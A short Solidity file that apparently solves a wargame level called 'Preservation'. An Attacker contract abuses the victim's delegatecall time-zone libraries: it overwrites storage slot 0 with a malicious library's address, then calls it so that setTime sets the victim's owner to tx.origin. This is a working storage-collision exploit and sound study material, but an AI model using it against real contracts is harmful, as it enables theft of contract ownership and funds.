import "./Preservation.sol";

pragma solidity ^0.4.18;

contract Attacker {
    function exploit () public {
        // Instance address
        Preservation victim = Preservation (0x4d1ab5a9cd797705d4552f9d67421558110d6c19);
        // MalignantLibraryContract address
        victim.setSecondTime (0x996d07fae5dd75b81a403601ea569f7c01fc5635);
        victim.setFirstTime (0);
    }
}

contract MalignantLibraryContract {
    address public timeZone1Library; // SLOT 0
    address public timeZone2Library; // SLOT 1
    address public owner;

    function setTime (uint _time) public {
      owner = tx.origin;
    }
}